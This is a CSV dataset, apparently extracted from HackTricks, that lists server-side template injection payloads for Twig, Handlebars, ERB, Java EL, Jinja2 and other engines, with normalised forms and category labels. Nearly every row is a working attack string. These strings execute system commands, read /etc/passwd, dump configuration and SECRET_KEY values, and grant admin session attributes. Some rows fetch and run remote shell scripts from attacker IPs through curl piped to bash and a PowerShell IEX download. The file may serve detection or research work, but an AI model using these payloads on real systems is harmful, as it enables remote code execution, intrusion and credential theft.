{{_self}} #(Ref. to current application),{{_self}}#(ref.tocurrentapplication),python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{dump(app)}},{{dump(app)}},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{app.request.server.all|join(',')}}",{{app.request.server.all|join('S')}},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{_self.env.registerUndefinedFilterCallback(""system"")}}{{_self.env.getFilter(""whoami"")}}","{{_self.env.registerundefinedfiltercallback(""S"")}}{{_self.env.getfilter(""S"")}}",python,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{_self.env.registerUndefinedFilterCallback(""system"")}}{{_self.env.getFilter(""id;uname -a;hostname"")}}","{{_self.env.registerundefinedfiltercallback(""S"")}}{{_self.env.getfilter(""S"")}}",python,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{['id']|filter('system')}},{{['S']|filter('S')}},python,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{['cat\x20/etc/passwd']|filter('system')}},{{['S']|filter('S')}},python,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{['cat$IFS/etc/passwd']|filter('system')}},{{['S']|filter('S')}},python,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{['id',""""]|sort('system')}}","{{['S',""S""]|sort('S')}}",python,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{[""error_reporting"", ""0""]|sort(""ini_set"")}}","{{[""S"",""S""]|sort(""S"")}}",python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{this.push ""return require('child_process').exec('whoami');""}}","{{this.push""S""}}",python,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}","{{:%Ntest%N.tostring.constructor.call({},%Nalert(%Nxss%N)%N)()}}",python,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{:""pwnd"".toString.constructor.call({},""return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()"")()}}","{{:""S"".tostring.constructor.call({},""S"")()}}",python,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"<%= system(""whoami"") %> #Execute code","<%=system(""S"")%>#executecode",ruby,ERB,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<%= Dir.entries('/') %> #List folder,<%=dir.entries('S')%>#listfolder,ruby,ERB,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<%= File.open('/etc/passwd').read %> #Read file,<%=file.open('S').read%>#readfile,ruby,ERB,1,low,enumeration,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<%= IO.popen('ls /').readlines() %>,<%=io.popen('S').readlines()%>,ruby,ERB,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{% import foobar %} = Error,{%importfoobar%}=error,python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{% import os %},{%importos%},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{% debug %},{%debug%},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{settings.SECRET_KEY}},{{settings.secret_key}},python,unknown,1,low,enumeration,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
${x},${x},java,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"<%= CreateObject(""Wscript.Shell"").exec(""powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')"").StdOut.ReadAll() %>","<%=createobject(""S"").exec(""S"").stdout.readall()%>",ruby,ERB,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<%= perl code %>,<%=perlcode%>,ruby,ERB,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<% perl code %>,<%perlcode%>,ruby,ERB,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{bad-stuff-here}},{{bad-stuff-here}},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
#{7*7} = 49 -- (legacy),#{N*N}=N--(legacy),ruby,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
${7*'7'} Nothing,${N*'S'}nothing,java,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
${foobar},${foobar},java,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{ request }},{{request}},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{'a'.toUpperCase()}},{{'S'.touppercase()}},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{'a'.concat('b')}},{{'S'.concat('S')}},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{'a'.getClass()}},{{'S'.getclass()}},python,unknown,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{request.getClass()}},{{request.getclass()}},python,unknown,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{request.getClass().getDeclaredMethods()[0]}},{{request.getclass().getdeclaredmethods()[N]}},python,unknown,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"${""aaaa""}","${""S""}",java,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"${{request}}, ${{session}}, {{faceContext}}","${{request}},${{session}},{{facecontext}}",java,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{groovy}},{{groovy}},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{groovy}}println(""id"".execute().text){{/groovy}}","{{groovy}}println(""S"".execute().text){{/groovy}}",python,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{1/0}} = Error,{{N/N}}=error,python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{foobar}} Nothing,{{foobar}}nothing,python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(""child_process"").exec('touch /tmp/pwned.txt')}()}","#{function(){localload=global.process.mainmodule.constructor._load;sh=localload(""S"").exec('S')}()}",ruby,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(""child_process"").exec('curl 10.10.14.3:8001/s.sh | bash')}()}","#{function(){localload=global.process.mainmodule.constructor._load;sh=localload(""S"").exec('S')}()}",ruby,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<%= foobar %> = Error,<%=foobar%>=error,ruby,ERB,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{foobar}} = Error,{{foobar}}=error,python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{7*7}} = Error,{{N*N}}=error,python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{config}},{{config}},python,unknown,1,low,enumeration,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{config.items()}},{{config.items()}},python,unknown,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{settings}},{{settings}},python,unknown,1,low,enumeration,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"@(""{{code}}"") <= Success","@(""S"")<=success",python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
@{} <= ERROR!,@{}<=error!,unknown,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<%= foo %>,<%=foo%>,ruby,ERB,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<%= response.write(date()) %>,<%=response.write(date())%>,ruby,ERB,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{ .Password }},{{.password}},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{printf ""%s"" ""ssti"" }}","{{printf""S""""S""}}",python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{html ""ssti""}}","{{html""S""}}",python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{js ""ssti""}}","{{js""S""}}",python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{""<script>alert(1)</script>""}}","{{""S""}}",python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{ .System ""ls"" }}","{{.system""S""}}",python,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"#{""""[""class""]}","#{""S""[""S""]}",java,Java-EL,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
"gk6q${""zkz"".toString().replace(""k"", ""x"")}doap2","gkNq${""S"".tostring().replace(""S"",""S"")}doapN",java,Java-EL,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
"https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40java.lang.Thread%40sleep(10000)%2c1%3f%23xx%3a%23request.toString}","https://www.example.url/?vulnerableparameter=${%N_memberaccess%Nd%Nognl.ognlcontext%Ndefault_member_access,%Nkzxs%Nd%Njava.lang.thread%Nsleep(N)%NcN%Nf%Nxx%Na%Nrequest.tostring}",java,Java-EL,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
"#{""""[""class""].forName(""java.lang.Runtime"").getMethod(""getRuntime"",null).invoke(null,null).exec(""curl <instance>.burpcollaborator.net"")}","#{""S""[""S""].forname(""S"").getmethod(""S"",null).invoke(null,null).exec(""S"")}",java,Java-EL,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
"${request.getAttribute(""c"").add(""ping x.x.x.x"")}","${request.getattribute(""S"").add(""S"")}",java,Java-EL,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
"${"""".getClass().forName(""java.lang.Runtime"").getMethods()[6].invoke("""".getClass().forName(""java.lang.Runtime"")).exec(""calc.exe"")}","${""S"".getclass().forname(""S"").getmethods()[N].invoke(""S"".getclass().forname(""S"")).exec(""S"")}",java,Java-EL,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
"${request.getClass().forName(""javax.script.ScriptEngineManager"").newInstance().getEngineByName(""js"").eval(""java.lang.Runtime.getRuntime().exec(\\\""ping x.x.x.x\\\"")""))}","${request.getclass().forname(""S"").newinstance().getenginebyname(""S"").eval(""S""pingx.x.x.x\\\""S""))}",java,Java-EL,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
${sessionScope.toString()},${sessionscope.tostring()},java,Java-EL,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
"${pageContext.request.getSession().setAttribute(""admin"", true)}","${pagecontext.request.getsession().setattribute(""S"",true)}",java,Java-EL,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
${user},${user},java,Java-EL,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
${password},${password},java,Java-EL,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
${employee.FirstName},${employee.firstname},java,Java-EL,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
{{ config }} #In these object you can find all the configured env variables,{{config}}#intheseobjectyoucanfindalltheconfiguredenvvariables,python,Jinja2,1,low,enumeration,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{% for key, value in config.items() %}","{%forkey,valueinconfig.items()%}",python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ dict.__base__.__subclasses__() }},{{dict.__base__.__subclasses__()}},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ dict.mro()[-1].__subclasses__() }},{{dict.mro()[-N].__subclasses__()}},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ (dict.mro()[-1]|attr(""\x5f\x5fsubclasses\x5f\x5f""))() }}","{{(dict.mro()[-N]|attr(""S""))()}}",python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %},{%witha=dict.mro()[-N].__subclasses__()%}{{a}}{%endwith%},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ ().__class__.__base__.__subclasses__() }},{{().__class__.__base__.__subclasses__()}},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ [].__class__.__mro__[-1].__subclasses__() }},{{[].__class__.__mro__[-N].__subclasses__()}},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ ((""""|attr(""__class__"")|attr(""__mro__""))[-1]|attr(""__subclasses__""))() }}","{{((""S""|attr(""S"")|attr(""S""))[-N]|attr(""S""))()}}",python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ request.__class__.mro()[-1].__subclasses__() }},{{request.__class__.mro()[-N].__subclasses__()}},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %},{%witha=config.__class__.mro()[-N].__subclasses__()%}{{a}}{%endwith%},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ [].class.base.subclasses() }},{{[].class.base.subclasses()}},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ ''.class.mro()[1].subclasses() }},{{'S'.class.mro()[N].subclasses()}},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }},{{'S'.__class__.__mro__[N].__subclasses__()[N]('S').read()}},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S','S').write('S')}}",python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
